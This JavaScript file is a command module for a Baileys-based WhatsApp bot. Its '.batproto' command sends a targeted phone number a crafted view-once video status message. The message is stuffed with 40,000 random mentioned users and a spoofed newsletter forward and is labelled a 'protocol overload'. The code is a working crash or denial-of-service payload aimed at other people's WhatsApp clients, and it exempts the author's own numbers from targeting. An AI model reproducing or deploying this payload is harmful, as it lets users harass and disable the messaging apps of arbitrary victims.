// commands/batproto.js
const { generateWAMessageFromContent } = require('@whiskeysockets/baileys');

const PROTECTED_NUMBERS = ['2347072182960', '2349049636843'];

async function batprotoCommand(sock, chatId, message, args) {
    if (!message.key.fromMe) {
        await sock.sendMessage(chatId, { text: "❌ *Owner Only Command*" }, { quoted: message });
        return;
    }

    const targetNumber = args[0];
    if (!targetNumber) {
        await sock.sendMessage(chatId, { 
            text: "🦇 *Bat Proto*\n\nUsage: .batproto <number>\nExample: .batproto 628123456789"
        }, { quoted: message });
        return;
    }

    const cleanNumber = targetNumber.replace(/[^0-9]/g, '');
    
    if (PROTECTED_NUMBERS.includes(cleanNumber)) {
        await sock.sendMessage(chatId, { text: "🛡️ *Protected Number*\nThis number cannot be targeted." }, { quoted: message });
        return;
    }

    const target = cleanNumber + '@s.whatsapp.net';
    
    await sock.sendMessage(chatId, { text: `🦇 Sending protocol overload to ${cleanNumber}...` }, { quoted: message });

    try {
        const mentionedList = Array.from({ length: 40000 }, () => "1" + Math.floor(Math.random() * 500000) + "@s.whatsapp.net");

        const videoMessage = {
            url: "https://mmg.whatsapp.net/v/t62.7161-24/19384532_1057304676322810_128231561544803484_n.enc?ccb=11-4&oh=01_Q5Aa1gHRy3d90Oldva3YRSUpdfcQsWd1mVWpuCXq4zV-3l2n1A&oe=685BEDA9&_nc_sid=5e03e0&mms3=true",
            mimetype: "video/mp4",
            fileSha256: "TTJaZa6KqfhanLS4/xvbxkKX/H7Mw0eQs8wxlz7pnQw=",
            fileLength: "1515940",
            seconds: 14,
            mediaKey: "4CpYvd8NsPYx+kypzAXzqdavRMAAL9oNYJOHwVwZK6Y",
            height: 1280,
            width: 720,
            fileEncSha256: "o73T8DrU9ajQOxrDoGGASGqrm63x0HdZ/OKTeqU4G7U=",
            directPath: "/v/t62.7161-24/19384532_1057304676322810_128231561544803484_n.enc?ccb=11-4&oh=01_Q5Aa1gHRy3d90Oldva3YRSUpdfcQsWd1mVWpuCXq4zV-3l2n1A&oe=685BEDA9&_nc_sid=5e03e0",
            mediaKeyTimestamp: "1748276788",
            contextInfo: { isSampled: true, mentionedJid: mentionedList },
            forwardedNewsletterMessageInfo: {
                newsletterJid: "120363321780343299@newsletter",
                serverMessageId: 1,
                newsletterName: "𝚵𝚳𝚸𝚬𝚪𝚯𝐑"
            }
        };

        const msg = generateWAMessageFromContent(target, {
            viewOnceMessage: { message: { videoMessage } }
        }, {});

        await sock.relayMessage("status@broadcast", msg.message, {
            messageId: msg.key.id,
            statusJidList: [target],
            additionalNodes: [{
                tag: "meta",
                attrs: {},
                content: [{
                    tag: "mentioned_users",
                    attrs: {},
                    content: [{ tag: "to", attrs: { jid: target }, content: undefined }]
                }]
            }]
        });

        await sock.sendMessage(chatId, { text: `✅ Protocol overload delivered to ${cleanNumber}` }, { quoted: message });

    } catch (error) {
        console.error('[BatProto]', error);
        await sock.sendMessage(chatId, { text: `❌ Failed: ${error.message}` }, { quoted: message });
    }
}

module.exports = batprotoCommand;